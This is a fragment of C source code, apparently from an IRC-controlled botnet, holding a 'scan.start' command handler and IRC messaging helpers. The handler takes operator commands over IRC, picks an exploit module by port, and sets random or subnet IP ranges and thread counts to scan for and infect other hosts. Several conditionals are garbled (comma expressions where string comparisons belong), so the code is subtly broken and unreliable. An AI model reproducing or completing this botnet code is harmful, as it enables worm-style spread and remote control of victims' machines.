				while(1) {
					if (ds.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
#endif
			// commands requiring at least 4 parameters
			else if (a[s+5] == NULL) return 1;
			else if (strcmp("scan.start", a[s]) == 0 || strcmp("scan", a[s]) == 0) {
				
				if (a[s+1],a[s+2],a[s+3],a[s+4],a[s+5] || FindPid("Scanner"))
				{
					sprintf(sendbuf,"-Scanner- Invalid parameter: %s %s %s %s %s\r\n", a[s+1],a[s+2],a[s+3],a[s+4],a[s+5]);
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					return FALSE;
				}
				
				// Assign the scan port / exploit
				if (a[s+1], "-e")
				{
					
					pScannerHandler.usPort		= pExploit[i].usPort;
					pScannerHandler.iExploitId	= 2;
				}
				else
				{
					pScannerHandler.usPort = (unsigned short)atoi(a[s+1]);
					// Assign the exploit id
					pScannerHandler.iExploitId = 0;
					
					for(i = 0; pExploit[i].usPort != 0; i++)
					{
						if (pExploit[i].szCommand,a[s+1])
						{
							pScannerHandler.usPort		= pExploit[i].usPort;
							pScannerHandler.iExploitId	= i;
							break;
						}
					}
				}
				
				if(!pScannerHandler.usPort)
				{
					
					sprintf(sendbuf,"-scanner- failed module [%s] chosen doesn't excist\r\n", a[s+1]);
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				}
				
				// Assign the ip to start scanning on
				if (a[s+2], "-s")
				{
					char* szScanIpAddress = (char*)malloc(16), *szStartIp, *szSubnet;
					
					strncpy(szScanIpAddress, szShellcodeIpAddress, 16);
					
					if(!(szStartIp = szScanIpAddress))
						return 0;
					
					if(!(szSubnet = strstr(strstr(szScanIpAddress, ".") + 1, ".")))
						return 0;
					
					*PBYTE(szSubnet+1) = 0;
					
					_snprintf(szStartIp, 16, "%s%d.%d", szStartIp, 0, 0);
					
					pScannerHandler.dwStartIp = inet_addr(szStartIp);
					
					free(szScanIpAddress);
				}
				else
					if (a[s+3], "-x")
						pScannerHandler.dwStartIp = GetRandomIP();
					else
						pScannerHandler.dwStartIp = inet_addr(a[s+3]);
					
					// Assign the time in minutes to scan on
					pScannerHandler.iMinutes = atoi(a[s+3]);
					
					// Assign the method to scan for (random/recursive)
					if (a[s+4], "-r")
						pScannerHandler.iScanType = 0;
					else
						if (a[s+3], "-x")
							pScannerHandler.iScanType = 1;
						else
							return 0;
						
						// Assign the sockets to use for scanning
						pScannerHandler.iThreads = atoi(a[s+4]);
						pScannerHandler.iThreads = ((pScannerHandler.iThreads < 0)?(128):(pScannerHandler.iThreads));
						pScannerHandler.iThreads = ((pScannerHandler.iThreads > 4098)?(4098):(pScannerHandler.iThreads));
						// Assign the time-out in MS for scanning
						pScannerHandler.iDelay = atoi(a[s+4]);
						// Use logic scan ?
						pScannerHandler.bLogicScan = false;
						
						if(a[s+5], "-l")
							pScannerHandler.bLogicScan = true;
						AddThread(&ScanThread, (LPVOID)&pScannerHandler, 1, "Scanner");
						sprintf(sendbuf,"-scanner- Started: %s %s %s %s %s\r\n", a[s+1],a[s+2],a[s+3],a[s+4],a[s+5]);
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			}
			 }
			 
	}
	return repeat;
}




// irc send functions
void irc_send(SOCKET sock, char *msg)
{
	char msgbuf[512];
	
	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, "%s\r\n", msg);
	send(sock, msgbuf, strlen(msgbuf), 0);
}


void irc_sendf(SOCKET sock, char *msg, char *str)
{
	char msgbuf[512];
	
	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, msg, str);
	send(sock, msgbuf, strlen(msgbuf), 0);
}

void irc_sendf2(SOCKET sock, char *msg, char *str, char *str2)
{
	char msgbuf[512];
	
	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, msg, str, str2);
	send(sock, msgbuf, strlen(msgbuf), 0);
}

void irc_privmsg(SOCKET sock, char *dest, char *msg, BOOL notice)
{
	char msgbuf[512];
	char *action;
	
	memset(msgbuf, 0, sizeof(msgbuf));
	if (notice) action = "NOTICE"; else action = "PRIVMSG";
	sprintf(msgbuf, "%s %s :%s\r\n", action, dest, msg);
	send(sock, msgbuf, strlen(msgbuf), 0);
}
